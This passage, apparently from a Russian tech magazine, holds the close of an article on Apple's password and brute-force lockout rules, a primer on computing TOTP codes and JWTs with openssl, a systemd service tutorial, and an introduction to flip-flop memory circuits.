Одноразовый код двухфакторной аутентификации всегда состоит из шести
цифр, а время действия ограничено тридцатью секундами. Получить его мож‐
но в виде push‐сооб щения на доверенное устройство (требуется доступ
в интернет, устройство необходимо раз блокировать), а также в виде SMS
или телефонного звонка на доверенный телефонный номер. Кроме того,
при  наличии  разблокированного  устройства  одноразовый  код можно
получить и без доступа к интернету из настроек устройства.



РЕАКЦИЯ НА ПОПЫТКУ ПЕРЕБОРА

Большинство пользователей, забывших тот или иной пароль, попытается
вспомнить его, попробовав ввести все множес тво ранее использованных
паролей. Реакция системы на подбор пароля будет отличаться в зависимос ти
от того, какой имен но пароль ты попытаешься подобрать.
 • Код бло кировки экрана. iOS будет увеличивать задержку между попыт‐
   ками ввода. Через определенное количес тво неудачных попыток устрой‐
   ство будет заблокиро вано: на экра не появится сообщение Connect
   to iTunes, но подключить устройство к компь ютеру не удастся из‐за акти‐
   вированного режима защиты USB. У тебя есть некоторая степень контро‐
   ля: так, в настрой ках можно вклю чить функцию Erase after 10 attempts,
   которая сбро сит устройство  к заводским нас тройкам после десяти
   неудачных попыток.
 • Пароль от iCloud. Попытка подоб рать пароль приведет к вре менной
   блокировке учетной записи. Точное количес тво доступных попыток не раз‐
   глашается. Важный момент: если ты попытаешь ся подобрать код бло‐
   кировки экрана устрой ства, защища ющий доступ к «Облачной связ ке клю‐
   чей» (а также паролю «Экранного времени», данным «Здоровья» и сооб‐
  щениям), то система удалит защищенные данные (ту самую «Облачную
   связку ключей» и далее по списку) пос ле десяти неудачных попыток.
 • Пароль от резервной копии iTunes. Никаких ограничений. Ломай
   на здоровье!
 • Пароль «Экранно го вре мени». Увеличивающаяся задержка между
   попытками ввода; пос ле десяти попыток задержка между попытками сос‐
   тавляет ровно час.
 • Од норазо вые коды  двухфакторной  аутен тификации. У  поль‐
   зователя есть ограниченное число попыток для ввода кода двухфакторной
   аутентификации. Если код подоб рать не уда лось, будут применяться пра‐
   вила реакции на попытку подбора пароля от iCloud.



ЗАКЛЮЧЕНИЕ

В статье мы попытались разобраться в запутанных взаимоотношениях между
четырьмя (с половиной) паролями Apple. Если тебе кажется, что после этой
статьи ты понимаешь еще мень ше, чем до нее, — это совершенно нормаль‐
но: о том, каким образом одни пароли влияют на дру гие, могут уве ренно рас‐
суждать разве что работники Apple, которые эту сис тему проекти ровали.
С нашей точки зрения, соз данная Apple система продумана не до конца
и местами нелогич на. Самыми нелогичными решени ями Apple нам представ‐
ляются возможности сброса пароля от резервной копии iTunes и пароля
от iCloud посредством одного лишь кода блокировки экрана. Система
безопасности, созданная Google, кажется нам гораздо более стройной
и логичной (о ней мы обя зательно напишем в будущем).
  Создается ощущение, что ряд правил и воз можнос тей вводились ком‐
панией либо под давлением пользователей («Как мне сбросить пароль
от резервной копии? Что, совсем никак? Ну вы…»), либо при попытке быстро
закрыть обнаруженную дыру в безопасности. Такой подход не позволяет нам
искренне похвалить соз данную в Apple систему безопасности пользователь‐
ской экосистемы. В то же время понятны и причины, по которым компании
пришлось пойти на компромиссы.
  К сожалению, компания не смог ла выдержать баланс между удобством
и безопасностью, придав чрезмерное зна чение одним факторам безопас‐
ности (код блокировки экра на и второй фактор аутентификации) и принизив
значение других (пароль от iCloud, который можно узнать или сбросить, если
есть доступ хотя бы к одному другому паролю или второму фактору аутен‐
тификации). Такой перекошенный баланс дела ет бесполезным и бес смыс‐
ленным использование сложных паролей к резервной копии (зачем, если его
можно сбросить в пару кликов?) и паролей от iCloud (зачем, если есть второй
фактор аутентификации, а сам пароль можно лег ко сбросить с устройства?).
ПРИВАТНОСТЬ





                                      Михаил Киреев
                                               kireevmp@yandex.ru
 КАК РАБОТАЮТ ТОКЕНЫ
   АУТЕНТИФИКАЦИИ
  И В ЧЕМ ИХ ОТЛИЧИЯ
     ОТ ПАРОЛЕЙ
       СПРАВОЧНИК АНОНИМА





Мы все окружены паролями, одноразовыми кодами, клю‐
чами и токенами, но не всегда знаем об их существовании.
Они каждую минуту обеспечивают безопас ность наших акка‐
унтов и данных. Однако нам с тобой важно знать, как именно
устроены самые базовые механизмы защиты информации.
Один из них — это токены аутентификации, которые повыша‐
ют надежность защиты дан ных и при этом не мешают ком‐
фортно пользовать ся сервисами.


Спра воч ник ано нима
Статьи из этого цик ла публику ются бес платно и доступны всем. Мы убеж‐
дены, что каждый имеет право на базовые знания о защите своих данных.
  Другие статьи цикла:
 • «Теория и практика шиф рования почты»;
 • «Виды шифрования и защиты тра фика, выбор софта»;
 • «Как шифровать переписку в Jabber: пошаго вая инструкция»;
 • «Делаем шпионскую флешку с защищенной операционкой Tails».

Если для тебя эти материалы тривиальны — отлично! Но ты сделаешь доброе
дело, отправив ссылку на них своим друзь ям, зна комым и родственникам,
менее подкованным в техничес ких вопросах.



ПОДПИСЫВАЕМСЯ ПОД ДАННЫМИ
И людям, и программам нужно знать, что данные были созданы доверенным
источником и остались неизменными. Для это го была придумана технология
генерации специального хеша (подписи), который под тверждает целос тность
информации и достоверность ее отпра вителя/соз дателя. Для создания этой
самой подписи исполь зуется схема из нескольких шагов, цель которых —
защитить данные от подделки.





  Схема генерации HMAC (hash‐based message authentication code), кода
  аутентификации сообщений с использовани ем хеш‐функции

Алгоритм хеширования может менять ся, но суть этого подхода проста и неиз‐
менна: для подтверждения целостности сообщения необходимо снова найти
подпись защищаемых данных и сравнить ее с имеющейся под писью.


ПРИДУМЫВАЕМ КОДЫ ДОСТУПА
Лю ди, которые придума ли двухфакторную аутентификацию, по всей видимос‐
ти, руководствовались принципом «одна голова хорошо, а две — лучше».
И действительно — два пароля точно безопас нее одного. Но пароли,
которые отправляет сайт в SMS, нельзя назвать абсолютно защищенными:
сообщение чаще всего можно перехватить. Другое дело — специальные при‐
ложения для аутентификации, они нацелены на полную защиту всего процес‐
са входа пользователя в акка унт. Именно их мы сейчас с тобой и разберем.
  Создание безопасных одно разовых паролей состоит из двух этапов:
 1. Первичная настрой ка — включение двухфакторной аутентификации.
 2. Использование пароля — непосредс твенный ввод кода и отправка
   для проверки.

В таком случае поль зователь с помощью приложения, доступного на любом
устройстве, сможет генерировать коды в соответс твии со всеми стандарта‐
ми.
  Первоначальная настройка приложения заключа ется в обме не секретным
клю чом между сервером и приложением для аутентификации. Затем этот
секретный ключ используется на устрой стве клиента, чтобы подписать дан‐
ные, которые известны и серверу, и клиенту. Этот ключ и служит главным под‐
тверждением личности пользователя при вводе пароля на сервере.
  На самом деле весь секрет — последователь ность из случайных сим‐
волов, которые закоди рова ны в формате Base32. Суммарно они занимают
не меньше 128 бит, а чаще и все 190 бит. Эту последовательность и видит
пользователь как текст или QR‐код.





                Так выглядит код QR для обмена секретом





                   Тот же самый секрет, только текстом

Как приложение создает одноразовые коды? Все просто: приложе ние
с помощью ключа хеширует какое‐то зна чение, чаще всего число, берет
определенную часть получившегося хеша и показывает пользователю в виде
числа из шести или восьми цифр.
  С самого начала для это го числа разработчики использовали простой
счетчик входов. Сер вер считал количес тво раз, которое ты заходил, нап‐
ример, на сайт, а приложению было извес тно, сколько раз ты запрашивал
одноразовый пароль. Именно это значение и исполь зовалось для создания
каждого сле дующего одноразового кода. В современных приложениях вмес‐
то счетчика берется текущее время — и это намного удобнее для поль‐
зователя: счетчики входов часто сбивались, и их приходилось нас траивать
заново.
   Теперь давай попробуем посчитать код для авто ризации самос тоятельно.
Для примера представим, что мы решили прямо в Новый год опубликовать
фотографию красивого фейерверка и, чтобы это сделать, нужно войти в свой
аккаунт, а значит, нам не обойтись без одноразового пароля.
   Возьмем  время  праз днования  Нового  года  в  формате  UNIX
(1577811600000) и посчитаем порядковый номер нашего пароля: поделим
на 30 секунд — 52593720. Воспользуемся нашим секретом и вычислим
хеш — по стандарту RFC 6238 это функция SHA‐1:


$ echo ‐n '52593720' | openssl sha1 ‐hmac 'QWERTYUI12345678'
e818e7f3efcb625658c603b08b12522f1e4d160a

Не забудь про аргумент ‐n для команды echo, чтобы в ее выводе не было
ненужного перевода стро ки, ина че хеш будет другим.
   Теперь дело за малым: нуж но получить шесть цифр, которые мы и будем
отправлять на сер вер при авторизации. Возьмем последние четыре бита
хеша — сдвиг, — это будет число a, или 10. Именно по этому сдви гу рас‐
положен наш код, который пока в виде байтов, — 03b08b12 = 61901586.
Отбросим все цифры этого числа, кроме шести последних, и получим наш
новенький, готовый к использованию одно разовый код — 901586.


ВХОДИМ В ПРИЛОЖЕНИЕ
Ни одно современное приложение не спрашивает пароль у пользователя
постоянно, поскольку пользователей это раз дражает. Именно поэтому раз‐
работчики и ученые‐криптогра фы придума ли токены, которые могут заменить
собой пару логин — пароль. Перед учеными стояла задача не столько скрыть
какую‐то информацию, сколько создать общий стандарт для ее хранения
и подтверждения ее надеж ности. Для всего этого была при думана технология
JSON Web Token (JWT).


КАК РАБОТАЕТ JWT?
Если есть данные, дос товерность которых следует подтвердить, нам надо
подписать их секретным ключом, используя HMAC. Для этого применя ется
такой же способ хеширования, что и для одноразовых паролей, только вмес‐
то шести цифр берется весь хеш целиком. Единственная разница — это сам
алгоритм хеширования: в таких токенах SHA‐1 считают слишком коротким
и небезопасным, поэтому обычно используют SHA‐256.
   Главная  задача JWT — подтверждение  личности  создателя  токена
и сопутствующих данных. Обычно содержимое токена — логин или дру гой
идентификатор пользователя.
  Давай попробуем создать свой токен. Продолжим нашу маленькую исто‐
рию с публикацией фотог рафии фейерверка в соцсети: мы вве ли одноразо‐
вый пароль, сервер под твердил нашу личность и хочет выдать токен, чтобы
мы смогли с его помощью открыть наше при ложение.
  Лю бой токен состоит из трех час тей: заголовка со служебной информа‐
цией, данных и подписи. Так как стандартом безопас ности считается SHA‐
256, то мы запишем его в наш заголо вок.


{
  "alg": "HS256"
}

Внутри самого токена будет храниться информа ция об идентификаторе акка‐
унта, в который мы только что вош ли.


{
  "user_id": 123456
}

Закодируем наши данные и заголо вок в Base64 и соединим их через точку.
Это делается, чтобы безопасно пересылать данные через HTTP: eyJhbG‐
ciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjogMTIzNDU2fQ.  Теперь, зная и данные,
и заголовок, мы можем посчитать ее хеш, который содержит наш пароль —
строку QWERTYUI12345678.


$ echo ‐n 'eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjogMTIzNDU2fQ' |
openssl sha256 ‐hmac 'QWERTYUI12345678'
e0a6b48a961ee3fc7eb38afcdb1a8ef22efb0572e1d5333b85db2aa66919e98e

Этот хеш нам тоже надо перевес ти в кодировку Base64 и затем присоединить
к уже имеющейся строке из заголовка и данных: eyJhbGciOiJIUzI1NiJ9.
eyJ1c2VyX2lkIjogMTIzNDU2fQ.4Ka0ipYe4/x‐s4r82xqO8i77BXLh1TM7hd‐
sqpmkZ6Y4 — это и есть наш токен. Можно пользоваться!





                         Так выглядит наш токен


        WWW

                     Подробнее про стандарт JWT можно почитать
                       на сайте организации RFC, а про реализацию
                       для своего любимого языка — на сайте jwt.io.



ЗАКЛЮЧЕНИЕ
Теперь ты знаешь, что происходит каждый день, когда ты откры ваешь бра‐
узер и заходишь в какой‐нибудь веб‐сервис. Понимая, как это работает, ты
сможешь лучше защитить свои данные, а возможно, даже решишь применить
какой‐то из этих методов в своих раз работках.
ТРЮКИ
ПОЛЕЗНЫЙ
ДЕМОН





      Даниил Батурин
   Координатор проекта VyOS
    (https://vyos.io), «языковед»,
    функциональщик, иногда
     сетевой администратор
         daniil@baturin.org

 КАК ПЕРЕСТАТЬ БОЯТЬСЯ
 SYSTEMD И СДЕЛАТЬ СВОЙ
 СЕРВИС ДЛЯ LINUX





Несмотря на множество проблем и противоречивые чувства
пользователей,  systemd уже  стал  стандартом де‐факто
в большинстве дистрибутивов Linux. С его помощью соз дать
несложный сер вис можно за пару минут и десяток строк нас‐
троек. В то же время многие более инте ресные возможнос‐
ти документированы не очень понятным языком или требуют
углубленных познаний в тонкостях работы systemd.


ОСНОВЫ
Если ты еще никогда не делал свои сервисы, начнем с основ. Systemd опе‐
рирует абстрактными единица ми (unit), которые бывают раз ных типов, могут
предоставлять различные ресурсы (процессы, сокеты, абстрактные «цели»)
и требовать других ресурсов для запус ка.
  Самый распространенный вид ресурса — сервис (service). Фай лы с опи‐
саниями сервисов и всего прочего лежат в катало ге /lib/systemd/system/.
Чтобы systemd нашел новый сервис, дос таточно положить в этот каталог свой
файл. Если этот сервис ранее не существовал, systemd прочитает файл и заг‐
рузит его в память. Однако, если ты редактируешь файл ранее запущенного
сервиса, не забудь зас тавить systemd перечитать файлы командой sudo
systemctl daemon‐reload!


Сервисы типа oneshot — долой rc.local
Когда‐то стандартным способом добавить выполнение команд в загрузку
системы было дописать их в /etc/rc.local. Очевидный недостаток — нет спо‐
собов следить, насколько успешно они выполнились. В systemd легко создать
для такой цели свой сервис типа oneshot, и им можно будет управлять через
systemctl, как любым дру гим. В этом случае systemd выполнит команду и пос‐
читает запуск сервиса успешным, если она завершилась с кодом ноль.
  Сохраним следующий файл в /lib/systemd/system/dumb‐test.service:


[Unit]
  Description=Dumb test


[Service]
  ExecStart=/bin/true
  Type=oneshot


[Install]
  WantedBy=multiuser.target

Дополнительных действий не требуется, и теперь ты можешь делать с ним
все то же, что с системными сервисами: запус тить с помощью sudo system‐
ctl  start  dumb‐test.service, поставить на загрузку с помощью sudo
systemctl enable dumb‐test.service и так далее.


Де лаем сервис из любой программы
Лю бой долгоживущий процесс можно лег ко превратить в сервис с помощью
опции Type=idle. В этом случае systemd перехватит стандартные потоки вво‐
да‐вывода и будет сле дить за жизнью процесса.
  Для демонстрации напишем  программу на  Python,  которая прос то
выводит сообщение в бесконечном цикле. Сохраним в /usr/local/bin/
test.py сле дующее:


import time


while True:
    print("Test service is alive")
    time.sleep(5)

Затем создадим для нее файл сервиса в /lib/systemd/system/smart‐
test.service:


[Unit]
  Description=Smart test


[Service]
  ExecStart=/usr/bin/python3 ‐u /usr/local/bin/test.py
  Type=idle
  KillMode=process


  SyslogIdentifier=smart‐test
  SyslogFacility=daemon


  Restart=on‐failure


[Install]
  WantedBy=multiuser.target

Теперь можно запустить наш сервис и убедиться, что он работает:


$ sudo systemctl status smart‐test.service
 smart‐test.service ‐ Smart test
   Loaded: loaded (/usr/lib/systemd/system/smart‐test.service; static
; vendor preset: disabled)
   Active: active (running) since Fri 2019‐10‐25 16:25:18 +07; 1s ago
 Main PID: 19893 (python3)
    Tasks: 1 (limit: 4915)
   Memory: 3.5M
   CGroup: /system.slice/smart‐test.service
           └─19893 /usr/bin/python3 ‐u /usr/local/bin/test.py

Стандартный вывод прог раммы пишется в journald, и его можно увидеть
в journalctl ‐u smart‐test. Ради интереса пос мотрим на работу опции
Restart=on‐failure. Оста новим наш процесс с помощью kill ‐9 ${Main
PID} и заглянем в логи:



  systemd[1]: Started Smart test.
  Test service is alive
  Test service is alive
  smart‐test.service: Main process exited, code=killed, status=9/KILL
  smart‐test.service: Failed with result 'signal'.
  smart‐test.service: Service RestartSec=100ms expired, scheduling
  restart.
  smart‐test.service: Scheduled restart job, restart counter is at 1.
  Stopped Smart test.
  Started Smart test.
  Test service is alive


Для настоящих демонов нужно использовать тип forking, но мы не будем
вдаваться в детали — авто ры таких пакетов наверняка все уже знают сами.


Зависимости и порядок запуска
Опций для настройки зависимости в systemd очень много. Прежде всего нуж‐
но отметить, что в нем есть два независимых механизма для указания по ряд-
ка запуска сервисов и зависимостей меж ду ними.


По рядок запуска сервисов
Порядок запуска сервисов определяется опциями Before и After. Если
в настройках сервиса foo написа но After=bar.service и оба сервиса дол‐
жны запуститься, то systemd сначала выпол нит попытку запус тить bar, а затем
foo.
  Однако опция After=bar.service сама по себе не поставит сервис
на загрузку. Более того, она никак не повлияет на решение запускать foo,
даже если запуск bar завершится неуда чей.
  Причина существования этих опций — способность systemd запускать
сервисы параллельно.
  Для примера возьмем типичный веб‐сервер с набором из веб‐приложе‐
ния FCGI, СУБД и обратного прокси. В каком порядке запускать процесс FCGI
и обратный прок си, не так важно. Зап росы будут работать, только когда они
оба запущены, но «неверный порядок» никак не помешает им запуститься.
   Если веб‐приложение требует данных из базы для инициализации, то мало
убедиться, что и процесс FCGI, и СУБД запущены, — приложение нужно
запускать только после полного запус ка СУБД. Именно для этих случаев
и предназначены опции Before/After.


Зависимости
Зависимости бывают двух видов: мягкие и жесткие. Если оба сервиса запус‐
тились успешно, то никакой разницы между ними нет. Раз личие вступает
в действие, если один из сервисов не смог запуститься: если зависимость
мягкая, то зависимые сервисы все равно будут запущены, а если жесткая, то
systemd не станет даже пробовать их запустить.
  Мягкие зависимости ука зываются с помощью опции Wants= в секции
[Unit]. Пример из sshd.service:


[Unit]
Description=OpenSSH server daemon
Documentation=man:sshd(8) man:sshd_config(5)
After=network.target sshd‐keygen.target
Wants=sshd‐keygen.target

Цель sshd‐keygen.target, очевидно, генерирует ключ хоста, если он отсутс‐
твует. Технически sshd не сможет запуститься без ключа хос та, поэтому,
почему авторы решили сделать зависимость мягкой, можно только догады‐
ваться. Возможно, они посчитали, что в большинс тве случаев ключ уже
существует и устаревший ключ лучше неработающего SSH.


             INFO

                    При копировании настроек из пакетов дистри‐
                        бутива нужно быть осторожным. Разработчики
                      дистрибутивов тоже люди и вполне могут соз‐
                        давать  неоптимальные  или  ошибочные  кон‐
                      фигурации. Кроме  того, если что‐то работает
                       для одного сервиса, совсем не факт, что оно же
                      подойдет  для  другого,   так   что  сверяйся
                        с документацией и тестируй перед выпуском.


Жесткие зависимости можно ука зать с помощью опции Requires. К примеру,
в systemd‐journal‐flush.service есть опция Requires=systemd‐jour‐
nald.service — очевидно, отпра вить команду journald невоз можно, пока он
не запущен.
   У этой опции существуют вариации, например RequiresMountsFor. Пос‐
мотрим в файл logrotate.service:


[Unit]
Description=Rotate log files
Documentation=man:logrotate(8) man:logrotate.conf(5)
RequiresMountsFor=/var/log

Для работы logrotate нужен доступ к каталогу с логами и больше ничего.
Опция RequiresMountsFor=/var/log поз воляет выразить именно это: сер‐
вис запустится, как только будет примонтирован каталог, содержащий путь
/var/log, даже если он находится не в корневом разделе.


ВНЕДРЯЕМСЯ В ЗАВИСИМОСТИ К ЧУЖИМ СЕРВИСАМ
В системах с System V init добавить что‐то в зависи мости к чужому сервису
можно было, лишь отредактировав его скрипт. Такие изменения, оче видно,
не переживут обновления системы, поэтому сделать их пос тоянными можно
было бы только пересборкой пакета.
  В systemd есть несколько спо собов решить эту проблему. Если нужно
именно внедриться к кому‐то в зависимос ти, мож но попробовать опции
обратных зависимостей: WantedBy и RequiredBy. Они дол жны находиться
в секции [Install], а не [Unit]. Подводных камня здесь два: они обрабаты‐
ваются только при уста новке сервиса с помощью systemctl  enable и,
как все в systemd, не всегда нормально работают во всех версиях.
   Второй вариант, который позволяет менять любые настройки: скопиро‐
вать файл сервиса в /etc/systemd/system/. Если один файл присутству ет
в обоих каталогах, то файл из /etc/systemd/system име ет приоритет.
   Третий, менее радикальный вариант: создать файл вида /etc/systemd/
system/${unit}.d/local.conf и прописать туда только нужные настройки.
  Для примера притворимся, что наш сервис smart‐test вовсе и не наш,
и добавим ему в зависимос ти sshd.service третьим способом. Создадим
файл /etc/systemd/system/smart‐test.service.d/local.conf со  сле‐
дующим содержанием:


[Unit]
  Requires=sshd.service

Теперь sshd.service будет запущен вмес те со smart‐test.service, даже если
раньше был вык лючен.
   Если важен не только сам факт запус ка обоих сервисов, но и порядок их
запуска, не забудь указать его с помощью опций Before или After.


Зависимости по умол чанию
Нужно отме тить, что systemd соз дает для каждого сервиса зависимос ти
по умолчанию. В большинс тве случаев это скорее благо, потому что поль‐
зовательские сервисы обычно требуют полностью инициализированной сис‐
темы для своей работы. Но если ты хочешь добавить новый шаг в процесс
загрузки системы, тебе нужно избавиться от этих зависи мос тей. Это можно
сделать опцией DefaultDependencies=no.
   Вот такой шаблон неп лохо работа ет для сервисов, которые дол жны запус‐
каться как можно раньше:


[Unit]
Description=My early boot step


DefaultDependencies=no


After=systemd‐remount‐fs.service

Просмотреть зависимости сервиса и убедиться, что там нет лишнего, можно
командой systemctl list‐dependencies ${unit}.


ЗАКЛЮЧЕНИЕ
Systemd можно любить или ненавидеть, но игнориро вать его невозможно —
нужно уметь с ним работать. Надеюсь, эти зна ния помогут тебе обратить sys‐
temd себе на пользу.
ТРЮКИ

ОСНОВЫ ЦИФРОВОЙ
СХЕМОТЕХНИКИ

 КАК ЛОГИЧЕСКИЕ ЭЛЕМЕНТЫ
  ОБРАЗУЮТ БИТЫ ПАМЯТИ
   В ТВОЕМ КОМПЬЮТЕРЕ





То,   что   компьютеры   могут   хранить
информацию в памяти, мы давно принима‐
ем за данность, но зна ешь ли ты, как имен‐
но эта память работает? В этом материале
мы  поговорим  о  последова тельностной               faberge                                                                             Цифровыхъ дѣлъ мастеръ
логике, которая позволяет компьютерам       fabulous.faberge@yandex.ru
хранить информацию. Какие возможности
это открывает и реально ли узнать сек‐
ретный ключ кодового замка, располагая
только  его  схемой, —  самое  время
это выяснить!


В НАЧАЛЕ БЫЛ БИТ
Пару месяцев назад мы приступили к изу чению циф ровой схемотехники
с базового блока NOT. Не будем изменять традиции и в этот раз, тем более
что блок на самом деле не так прост, как кажется на первый взгляд. Возьмем
парочку и соединим их последовательно.





Кто‐то может сказать, что это совершенно бес смысленная схе ма, ведь сиг‐
нал на выходе всегда равен входному. Дей ствитель но, применяя логическое
отрицание дважды, мы получаем исходное утверждение. Если ты не «белый»
хакер, ты «черный». Не «небелый» — по‐прежнему «белый». Это выглядит
как бесполезная сло весная эквилиб ристика, но все меняется, если в схе ме
выше попробовать вход замкнуть на выход.





Теперь, если в правой половине у нас высокий логический уровень, в левой
половине всегда будет низкий (и наоборот). Ина че говоря, схема приобре‐
тает свойство бистабильнос ти и принимает лишь одно из двух воз можных
состояний. Совсем как бит памяти — или переменная bool в С/С++.
  Для наглядности можно собрать схему на макетной плате. Здесь подой дет
любой инвертор — например, 74HC04B. Это шесть логичес ких вен тилей NOT
в корпусе DIP‐14 (целых три бита информации, Карл!). Впрочем, как ты уже
понимаешь, одну и ту же функцию мож но реализовать несколькими способа‐
ми, поэтому здесь наш выбор практически не ограничен.


             INFO

                          Тут стоит упомянуть, что с теми же целями мы
                    можем использовать и 74HC00N (четыре элемен‐
                          та NAND). Эта микросхема получила свой особый
                        «нулевой» номер в серии 74хх не просто так —
                        логическая операция И — НЕ обладает замеча‐
                         тельным  свойством функциональной  полноты.
                   Иными  словами,  мы  можем  любой  другой
                      базовый блок (AND, OR и остальные) разложить
                       на комбинацию блоков NAND. Аналог в отечес‐
                        твенной микроэлектронике — 155ЛА3, и это нас‐
                        только популярная у радиолюбите лей микросхе‐
                        ма, что в ее честь даже называют сайты.


Простой пример (как на картинке выше) поз воля ет на практике убе диться, что
микросхема работает, как мы предполага ли. Для мигания светодиодами
и переключения состояний в такой ячейке памяти достаточно прикасаться
концами проводов (от земли или питания) к соот ветс твующим выводам мик‐
росхемы. Возможно, само по себе это зву чит и не очень увлекательно,
но размышле ние в процессе должно навести на интересные идеи.


Некото рая неоп ределен ность
В какой‐то момент твой пытливый хакерский ум наверняка задался воп‐
росом — а что, если подать одно и то же напряжение на обе половинки од‐
новременно? И в каком сос тоянии окажется наша схема после? В сущности,
это сродни делению на ноль в матема тике (или программировании) — зап‐
рещенная операция, результат на выходе которой не определен. Парадок‐
сально, но даже такое свойство может иметь практическое применение!
Инженеры в Intel хорошо знают схемотехнику (кто бы сомневался), и встро‐
енный в их процессоры генера тор случайных чисел работает именно по та‐
кому принципу.


Сейчас работа нашей схемы напоминает электромеханические компьюте ры
середины сороковых годов XX века, когда коммутация сигналов внутри
устройства выполнялась с помощью реле и переключателей. Самое время
добавить новые возможности и перей ти от инверторов к эле ментам с нес‐
колькими входами.


ПРОСТОЙ RS-ТРИГГЕР
Внесем минимальные изменения в нашу схему и воспользуемся допол‐
нительными входами NAND. Назовем их nR и nS (not RESET и not SET соот‐
ветственно, их назначение прояснится в дальнейшем).





Оба входа могут принимать по два зна чения, итого предстоит разобрать
четыре варианта. Начнем с базового случая nR = 1 и nS = 1. При этом
на выходах Q и nQ уже есть какие‐то зна чения. Обра ти внимание, что если Q =
1, то при nS = 1 результатом операции NAND будет низкий уровень, то есть nQ
= 0. И наоборот, если Q = 0, то nQ = 1 и оба выхода в нашей схеме действи‐
тельно принимают противоположные значения. Другими словами, если один
из входов вентиля NAND ока зывается в состоянии логичес кой единицы, то сиг‐
нал на выходе определя ется как инверсия вто рого входа — в точности как с
инверторами чуть ранее! Таким образом, при nR = 1 и nS = 1 схема сох‐
раняет свое старое состояние и выходы не обновляются.
   Теперь рассмотрим вариант с nR = 1 и nS = 0. Так как на входе верхне го
элемента NAND точно есть хотя бы один ноль, то его выход в любом случае
будет равен логической единице. Зна чит, Q = 1, и, следовательно, nQ = 0.
Аналогично, при nR = 0 и nS = 1 мы можем схожим образом вывести, что
состояние схемы будет полностью противополож ным (Q = 0 и nQ = 1).
  Остается разоб рать заключительный вари ант, где оба входа равны нулю
одновременно. На инту итивном уровне можно уже предполагать, что тут
что‐то не так. Действительно, при nR = nS = 0 результат элемента NAND
не может быть положительным ни при каких воз можных значениях допол‐
нительного входа (рекомендую проверить по таблице истинности). Следова‐
тельно, Q = nQ = 0, и это единственный слу чай, когда наша схема «сбоит».
В дальнейшим мы ее улучшим и обязательно изба вимся от этого недос татка.
  Но сейчас самое время оста новиться и перевести  дух. Выше были
не самые тривиальные рассуждения, и если ты  чего‐то не понял, то
это совершенно нормально. Последовательнос тные схемы сложнее для вос‐
приятия, и именно поэто му в предыдущей статье мы начали знакомство
с комбинационной логики.
   Так что советую перечитать нес коль ко абза цев выше еще раз. Тем более
что это ключевая схема и далее в статье многие элементы будут основаны
именно на ней. А вообще, самый правиль ный способ разобраться в любой
схеме раз и навсегда — это взять ручку и листочек бумаги (или стилус и план‐
шет) и последовательно рас смотреть каждый из возможных вари антов. Я
сужу по личному опыту — в твоем случае может сра ботать что‐то еще.


Прак тическое примене ние
Надеюсь, теперь прин цип работы RS‐триггера для тебя больше не секрет
и тебе уже не тер пится применить полученные знания на практике. Для этого
понадобится микросхема IW4011, которая содержит четыре вентиля NAND
(подойдет и любой зарубежный ана лог).


             INFO

                    Серия микросхем 4000 — это еще один прек‐
                      расный   набор   «стро ительных   кирпичиков»,
                       которые раньше широко использовались при раз‐
                       работке устройств. В отличие от уже упоминав‐
                      шегося семейства 7400, эти компоненты работа‐
                     ют с расширен ным диапазоном входных нап‐
                      ряжений (до 15 В). Следует помнить, что, хотя
                      обе серии реализуют более‐менее одинаковый
                      набор    логических    схем,    совместимость
                      по выводам не гарантируется.


Наверняка ты уже зна ком с таким неприятным явлением в электронике,
как дребезг контактов. Он воз ника ет всякий раз, когда участки цепи ком‐
мутируются механически: при нажатии тактовой кнопки, переключении тум‐
блера, реле и во многих других случаях. Как правило, с дре безгом пред‐
почитают бороться программно: кратковременные изменения в сигнале
(момент соприкосновения контактов) прос то игнориру ются устройством.
   Это распространенный и дос таточно эффективный способ: реализацию
подобной функции можно найти и в Arduino (биб лиотека Bounce2). Однако
у такого метода есть и свои минусы: обра ботку сиг нала приходится задер‐
живать на какое‐то время (порядка нескольких десятков миллисекунд).
Во многих случаях это не становится большой проблемой.
  Но что, если нажатие на кнопку обра батывает ся в прерывании? Или мы
проектируем клавиатуру для геймеров и хотим получить минимальное время
отклика? Да, «лишние» миллисекунды, конечно, не выведут тебя на первые
строчки в ладдерах популярных игр, но некото рое преиму щество точно обес‐
печат. Попробуем применить здесь RS‐триггер и нарисуем такую схему.





Мы используем два вентиля NAND, то есть только «половину» микросхемы
CD4011 (К561ЛА7). Обра ти внимание, это не стандартная тактовая кнопка: тут
работает перекидной контакт без фиксации, так что в каждый момент вре‐
мени коммутируются ровно два вывода. Приятная особенность таких кнопок
в том, что при нажатии они изда ют слабый щелчок, похожий на звук перек‐
лючателей в механической клавиату ре.
   Аппаратные решения хороши своей простотой и безотказностью — прог‐
рамма может зависнуть или исчерпать доступную память, тогда как с триг‐
герами таких проб лем нет.


ПРОДВИНУТЫЙ D-ТРИГГЕР
Освоившись с установкой и сбросом внутреннего состояния в прос той схе‐
ме, перейдем к более интерес ным вещам. Как и в программировании, теперь
мы можем  пов торно  использовать  готовые  логичес кие  блоки,  чтобы
эффективно  абстрагировать ся  от  возрастающей  сложности  устройств.
Это примерно как с кодом — единожды реализовав нужную функцию
или алгоритм, ты можешь добавлять их в необ ходимые места, не заботясь
о стеке вызовов и конкретных адресах в памяти.
   Как ты помнишь, ключевое неудобство в RS‐триггере вызывало то, что
при nR = nS = 0 мы получали оди наковое сос тояние на прямом  (Q) и,
казалось бы, инвер сном (nQ) выходе. Попробу ем избавиться от этой проб‐
лемы. Для этого будем явно бло кировать один из сигналов, если другой
в этот момент активен.





Теперь состояние входа данных  (D) через пару вентилей NAND подается
на оба входа RS‐триггера, а сигнал разрешения (E) контролиру ет момент
времени, когда состояние пра вой половины схемы может меняться.





           D‐защелка — это почти как D‐мейл, только защел ка

Можно пойти еще дальше и объединить две защел ки в один триггер, который
будет срабатывать только по переднему фронту тактового сигнала (переход
с низкого уровня на высокий). Это наиболее универсальная схема, так
как позволяет мгновенно зафиксировать состояние всех сигналов на входных
линиях, а уже потом прис тупить к формирова нию результата с помощью ком‐
бинационной логики.





Прак тическое примене ние
В 4000‐й серии пару D‐триггеров реализует микросхема CD4013 (отечес‐
твенный аналог — К561ТМ2). Назначение ее выводов ты можешь уви деть
на схеме ниже. Обрати внимание, что, помимо вхо дов данных и тактового
сигнала, тут выведены контакты для асин хронного сброса и установки внут‐
реннего состояния триггера.





Асинхронность означает, что событие происходит мгновенно, не дожидаясь
следующего так тового сигнала. И наобо рот, обновления с линии данных идут
синхронно с изме нениями на линии CLK.
   Таким образом, комбинируя микросхемы CD4011 (561ЛА7) и CD4013
